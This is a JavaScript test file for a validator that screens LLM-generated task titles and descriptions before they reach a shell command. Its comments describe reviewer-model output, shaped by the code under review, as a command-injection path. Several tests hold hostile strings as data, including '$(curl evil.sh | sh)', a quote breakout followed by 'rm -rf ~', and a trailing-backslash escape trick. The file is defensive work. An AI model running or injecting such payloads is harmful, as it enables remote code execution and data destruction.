import { test, describe } from 'node:test';
import assert from 'node:assert';
import { validateNewTask } from '../fleet-sprint/runner.js';
import { buildFallbackNewTask, escapeToAsciiJson } from '../fleet-sprint/abort.mjs';

// apra-fleet-unw2.3 (N3): reviewer-authored newTasks (title/description/
// priority) are LLM output whose own context includes the diff under
// review. Before this fix, runner.js interpolated them into a
// `bd create "..."` shell command with only double-quotes escaped --
// backticks and `$(...)` survive inside POSIX double quotes, and a
// trailing backslash can neutralize the escaping entirely. These tests
// pin validateNewTask() -- the allowlist gate that now runs BEFORE any
// interpolation -- so no adversarial payload of this shape can ever reach
// `command()` again.
//
// apra-fleet-eft.56.1: `description` no longer reaches that shell
// interpolation at all -- createChildBeadWithAllocatedId() now writes it to
// a local temp file and hands it to `bd create --body-file`, so it is
// validated against the more permissive SAFE_DESCRIPTION_RE (ASCII-
// printable, non-empty) instead of SAFE_TEXT_RE. `title` is still
// interpolated inline into the `bd create "..."` command string, so it
// keeps the strict SAFE_TEXT_RE allowlist.

describe('validateNewTask', () => {
    test('accepts a realistic, safe title/description/priority', () => {
        const result = validateNewTask({
            title: 'Fix 401 handling in client.js',
            description: "Add retry logic (max 3x), per review notes: see PR 12, section 3.1 - it's required.",
            priority: 'P2',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.title, 'Fix 401 handling in client.js');
        assert.strictEqual(result.priority, 'P2');
    });

    test('accepts all valid priority values P0-P4', () => {
        for (const priority of ['P0', 'P1', 'P2', 'P3', 'P4']) {
            const result = validateNewTask({ title: 'Safe title', description: 'Safe description.', priority });
            assert.strictEqual(result.ok, true, `expected P-priority '${priority}' to be accepted`);
        }
    });

    test('rejects bogus priority values', () => {
        for (const priority of ['urgent', 'P99', '', 'p1', 'P1 ', ' P1', 'P1;rm -rf', undefined, null]) {
            const result = validateNewTask({ title: 'Safe title', description: 'Safe description.', priority });
            assert.strictEqual(result.ok, false, `expected priority ${JSON.stringify(priority)} to be rejected`);
            assert.match(result.reason, /priority/);
        }
    });

    test('rejects $(...) command substitution in title', () => {
        const result = validateNewTask({
            title: 'Innocuous title $(curl evil.sh | sh)',
            description: 'Safe description.',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, false);
        assert.match(result.reason, /title/);
    });

    test('accepts $(...) in description (no longer shell-interpolated -- see eft.56.1)', () => {
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Do the thing $(curl evil.sh | sh) after this.',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.description, 'Do the thing $(curl evil.sh | sh) after this.');
    });

    // apra-fleet-v75: the allowlist excluded [ ] and +, which is this project's own
    // bead-title convention ([bug]/[epic]/[test] prefixes). A real reviewer follow-up
    // was rejected mid-sprint on the title below, while the planner created a
    // bracketed title through bd directly in the same run -- one door rejecting what
    // the other accepts. All three characters are inert inside the double quotes of
    // `bd create "${title}"` in both POSIX shells and PowerShell.
    test('accepts the project bracket convention and + in a title', () => {
        for (const title of [
            '[test] transit query + GET /transits route tests (filters, ordering, open transit)',
            '[bug] kb_capture reports success but writes nothing',
            'Support a + b in titles',
        ]) {
            const result = validateNewTask({ title, description: 'Safe description.', priority: 'P2' });
            assert.strictEqual(result.ok, true, `expected ${JSON.stringify(title)} to be accepted: ${result.reason}`);
        }
    });

    test('still rejects the shell-live characters that survive double quoting', () => {
        for (const title of [
            'Break out" here',        // closes the quote
            'Trailing backslash \\',  // escapes the closing quote
            'Expand $HOME now',       // parameter expansion
        ]) {
            const result = validateNewTask({ title, description: 'Safe description.', priority: 'P2' });
            assert.strictEqual(result.ok, false, `expected ${JSON.stringify(title)} to stay rejected`);
        }
    });

    // apra-fleet-vk0a: a backtick in TITLE is no longer a hard rejection --
    // sanitizeNewTaskTitle() rewrites it to a single quote (Markdown
    // inline-code style, no special meaning in a bd title) before the
    // SAFE_TEXT_RE check runs, so a genuinely useful finding is not silently
    // demoted to a freetext note just for referencing a CLI command in
    // backticks. See sanitizeNewTaskTitle()'s doc comment in runner.js.
    test('sanitizes backticks in title to single quotes rather than rejecting (apra-fleet-vk0a)', () => {
        const result = validateNewTask({
            title: 'Run `whoami` and report',
            description: 'Safe description.',
            priority: 'P1',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.title, "Run 'whoami' and report");
    });

    test('accepts backticks-as-text in description (no longer shell-interpolated -- see eft.56.1)', () => {
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Payload: `rm -rf /` embedded here.',
            priority: 'P1',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.description, 'Payload: `rm -rf /` embedded here.');
    });

    test('rejects a trailing backslash (quote-escape trick)', () => {
        const result = validateNewTask({
            title: 'Safe-looking title\\',
            description: 'Safe description.',
            priority: 'P3',
        });
        assert.strictEqual(result.ok, false);
        assert.match(result.reason, /title/);
    });

    test('accepts a trailing backslash in description (no longer shell-interpolated -- see eft.56.1)', () => {
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Safe-looking description\\',
            priority: 'P3',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.description, 'Safe-looking description\\');
    });

    test('rejects a literal double-quote (would close the bd create quoting early)', () => {
        const result = validateNewTask({
            title: 'Title" ; rm -rf ~ ; echo "pwned',
            description: 'Safe description.',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, false);
        assert.match(result.reason, /title/);
    });

    test('accepts a bare dollar sign in description (no longer shell-interpolated -- see eft.56.1)', () => {
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Cost is $100 -- not a real payload but still outside the old allowlist.',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.description, 'Cost is $100 -- not a real payload but still outside the old allowlist.');
    });

    test('accepts technical characters (=, &, +, quotes) in description -- apra-fleet-eft.56', () => {
        const result = validateNewTask({
            title: 'Fix env-var handling',
            description: 'Set APRA_FLEET_BD_MOCK=off; also test accessToken + synthesized & "quoted" values.',
            priority: 'P1',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.description, 'Set APRA_FLEET_BD_MOCK=off; also test accessToken + synthesized & "quoted" values.');
    });

    test('rejects non-ASCII characters in description (repo-wide ASCII-only convention)', () => {
        // The description below embeds a genuine non-ASCII code point via a
        // JS unicode escape sequence (not a literal byte), so this source
        // file itself stays ASCII-only per repo convention while still
        // exercising SAFE_DESCRIPTION_RE's rejection of non-ASCII at runtime.
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Non-ASCII payload: caf\u00e9.',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, false);
        assert.match(result.reason, /description/);
    });

    test('sanitizes em-dash, curly quotes, and ellipsis in description to ASCII equivalents -- apra-fleet-04g.2', () => {
        // The description below embeds em-dash, curly single quotes, curly
        // double quotes, and a horizontal ellipsis via JS unicode escapes so
        // this source file itself stays ASCII-only, while still exercising
        // sanitizeNewTaskDescription()'s normalization at runtime -- this is
        // the exact 04g.2 repro (an em-dash silently blocking canary closure).
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Reviewer said \u2014 \u2018looks good\u2019 \u201Cship it\u201D\u2026',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.description, "Reviewer said -- 'looks good' \"ship it\"...");
    });

    test('still rejects a description containing an unhandled non-ASCII character (e.g. emoji)', () => {
        // \u{1F600} (grinning face emoji) via a JS unicode escape keeps the
        // source ASCII-only while exercising fail-closed behaviour: emoji is
        // not in sanitizeNewTaskDescription()'s substitution table, so it must
        // still be rejected after normalization.
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Reviewer reaction: \u{1F600}',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, false);
        assert.match(result.reason, /description/);
    });

    test('rejects empty title/description', () => {
        assert.strictEqual(validateNewTask({ title: '', description: 'x.', priority: 'P2' }).ok, false);
        assert.strictEqual(validateNewTask({ title: 'x', description: '', priority: 'P2' }).ok, false);
    });

    test('rejects non-string / missing fields gracefully (no throw)', () => {
        assert.doesNotThrow(() => validateNewTask({}));
        assert.doesNotThrow(() => validateNewTask({ title: 123, description: null, priority: undefined }));
        assert.strictEqual(validateNewTask({}).ok, false);
    });

    test('accepts square brackets in title (apra-fleet-19o.1 -- planner [test] convention)', () => {
        const result = validateNewTask({
            title: '[test] Fix race condition in auth handler',
            description: 'Ensure proper locking mechanisms.',
            priority: 'P1',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.title, '[test] Fix race condition in auth handler');
    });

    test('accepts complex title with square brackets', () => {
        const result = validateNewTask({
            title: '[test] [blocker] Validate auth flow (v2)',
            description: 'Test description.',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.title, '[test] [blocker] Validate auth flow (v2)');
    });

    test('still rejects genuinely unsafe characters ($, quote, backslash) in title', () => {
        // Backtick is deliberately excluded from this list: it is sanitized
        // (rewritten to a single quote), not rejected -- see the dedicated
        // 'sanitizes backticks in title' test above.
        const unsafeChars = [
            'Title with $(injection)',
            'Title with "quote',
            'Title with backslash\\',
        ];
        for (const title of unsafeChars) {
            const result = validateNewTask({
                title,
                description: 'Safe description.',
                priority: 'P1',
            });
            assert.strictEqual(result.ok, false, `expected title "${title}" to be rejected`);
            assert.match(result.reason, /title/);
        }
    });
});

// Reviewer newTask titles containing arrows or comparison operators used to
// be rejected outright (SAFE_TEXT_RE admits none of > < = &), so the finding
// never became a bead. sanitizeNewTaskTitle() now spells them out from a
// FIXED table; sanitizeNewTaskDescription() maps Unicode arrows to ASCII.
// Unicode code points are written as \u escapes so this file stays ASCII.
describe('validateNewTask -- arrows and comparison operators', () => {
    const ok = (title, description = 'Safe description.') => {
        const result = validateNewTask({ title, description, priority: 'P2' });
        assert.strictEqual(result.ok, true, `expected ${JSON.stringify(title)} to be accepted: ${result.reason}`);
        return result;
    };

    test('ASCII arrows map to " to " in a title', () => {
        assert.strictEqual(ok('a -> b').title, 'a to b');
        assert.strictEqual(ok('a => b').title, 'a to b');
        assert.strictEqual(ok('a-->b').title, 'a to b');
        assert.strictEqual(ok('a <-> b').title, 'a to/from b');
    });

    test('Unicode arrows map to words in a title', () => {
        assert.strictEqual(ok('Route a \u2192 b').title, 'Route a to b');
        assert.strictEqual(ok('a \u21D2 b').title, 'a to b');
        assert.strictEqual(ok('a \u27F6 b').title, 'a to b');
        assert.strictEqual(ok('a \u2190 b').title, 'a from b');
        assert.strictEqual(ok('a \u2194 b').title, 'a to/from b');
        // em dash followed by > is an arrow too (the dash rewrite runs first)
        assert.strictEqual(ok('a \u2014> b').title, 'a to b');
    });

    test('comparison operators and & map to words in a title (multi-char before single)', () => {
        assert.strictEqual(ok('x >= y').title, 'x at least y');
        assert.strictEqual(ok('x <= y').title, 'x at most y');
        assert.strictEqual(ok('x\u2265y').title, 'x at least y');
        assert.strictEqual(ok('x > y').title, 'x gt y');
        assert.strictEqual(ok('x<y').title, 'x lt y');
        assert.strictEqual(ok('x = y').title, 'x eq y');
        assert.strictEqual(ok('x == y').title, 'x eq y');
        assert.strictEqual(ok('x != y').title, 'x ne y');
        assert.strictEqual(ok('Tom & Jerry').title, 'Tom and Jerry');
        assert.strictEqual(ok('a && b').title, 'a and b');
    });

    test('repeated spaces are collapsed and the title is trimmed', () => {
        assert.strictEqual(ok('  retry  ->  backoff  ').title, 'retry to backoff');
    });

    test('a description with Unicode arrows passes and becomes ASCII arrows', () => {
        const result = ok('Safe title', 'Flow: a \u2192 b \u21D2 c, x \u2265 1');
        assert.strictEqual(result.description, 'Flow: a -> b => c, x >= 1');
    });

    test('a mapped title keeps the escaped original title at the top of the description', () => {
        const generic = ok('Map<String, List<T>> leaks', 'Body.');
        assert.strictEqual(generic.title, 'Map lt String, List lt T gt gt leaks');
        assert.strictEqual(
            generic.description,
            'Original title (JSON-escaped, non-ASCII as \\uXXXX): "Map<String, List<T>> leaks"\n\nBody.',
        );
        const flag = ok('Honour --flag=value', 'Body.');
        assert.strictEqual(flag.title, 'Honour --flag eq value');
        assert.strictEqual(
            flag.description,
            'Original title (JSON-escaped, non-ASCII as \\uXXXX): "Honour --flag=value"\n\nBody.',
        );
        // Non-ASCII in the original title is \uXXXX-escaped and still round-trips.
        const unicode = ok('Route a \u2192 b', 'Body.');
        assert.strictEqual(unicode.title, 'Route a to b');
        assert.match(unicode.description, /^[\t\n\r\x20-\x7E]+$/);
        const escaped = unicode.description.split('\n')[0].replace(/^[^"]*/, '');
        assert.strictEqual(JSON.parse(escaped), 'Route a \u2192 b');
    });

    test('an unchanged or whitespace-only-changed title leaves the description untouched', () => {
        assert.strictEqual(ok('Fix 401 handling', 'Body.').description, 'Body.');
        assert.strictEqual(ok('  Fix  401 handling ', 'Body.').description, 'Body.');
    });

    test('", $ and backslash still hard-reject in a title even next to an arrow', () => {
        for (const title of ['a -> "b"', 'a -> $HOME', 'a -> b\\']) {
            const result = validateNewTask({ title, description: 'Safe description.', priority: 'P2' });
            assert.strictEqual(result.ok, false, `expected ${JSON.stringify(title)} to stay rejected`);
            assert.match(result.reason, /title/);
        }
    });
});

describe('buildFallbackNewTask -- unsanitisable titles', () => {
    test('strips only the fallback title and escapes the original title to ASCII in the description', () => {
        const original = 'Fix $HOME "x" caf\u00E9 \u2192 y';
        assert.strictEqual(validateNewTask({ title: original, description: 'Body.', priority: 'P1' }).ok, false);
        const fallback = buildFallbackNewTask({ title: original, description: 'Body.', priority: 'P1' });
        assert.ok(fallback && fallback.ok);
        assert.strictEqual(fallback.title, 'Fix HOME x caf to y');
        assert.strictEqual(
            fallback.description,
            'Original title (JSON-escaped, non-ASCII as \\uXXXX): "Fix $HOME \\"x\\" caf\\u00E9 \\u2192 y"\n\nBody.',
        );
        assert.match(fallback.description, /^[\t\n\r\x20-\x7E]+$/);
        const escaped = fallback.description.split('\n')[0].replace(/^[^"]*/, '');
        assert.strictEqual(JSON.parse(escaped), original);
        assert.strictEqual(fallback.priority, 'P1');
    });

    test('a leading-dash unsanitisable title gets exactly one original-title line quoting the true original', () => {
        for (const [original, expectedTitle] of [['--force "$X" breaks', 'force X breaks'], ['-- "quoted" thing', 'quoted thing']]) {
            const fallback = buildFallbackNewTask({ title: original, description: 'Body.', priority: 'P2' });
            assert.ok(fallback && fallback.ok, `expected a fallback for ${JSON.stringify(original)}`);
            assert.strictEqual(fallback.title, expectedTitle);
            assert.strictEqual(fallback.description.split('Original title (').length - 1, 1, fallback.description);
            assert.strictEqual(
                fallback.description,
                `Original title (JSON-escaped, non-ASCII as \\uXXXX): ${JSON.stringify(original)}\n\nBody.`,
            );
        }
    });

    test('uses a placeholder title when nothing survives the strip', () => {
        const fallback = buildFallbackNewTask({ title: '$$$', description: 'Body.', priority: 'P2' });
        assert.strictEqual(fallback.title, 'Follow-up finding (original title not shell-safe)');
    });

    test('does not rescue a priority or description failure', () => {
        assert.strictEqual(buildFallbackNewTask({ title: '$x', description: 'Body.', priority: 'P9' }), null);
        assert.strictEqual(buildFallbackNewTask({ title: '$x', description: '', priority: 'P2' }), null);
        assert.strictEqual(buildFallbackNewTask({ title: '$x', description: 'emoji \u{1F600}', priority: 'P2' }), null);
    });

    test('escapeToAsciiJson round-trips through JSON.parse', () => {
        const s = 'a\u2192b "q" \\ \u{1F600}';
        const out = escapeToAsciiJson(s);
        assert.match(out, /^[\x20-\x7E]+$/);
        assert.strictEqual(JSON.parse(out), s);
    });
});
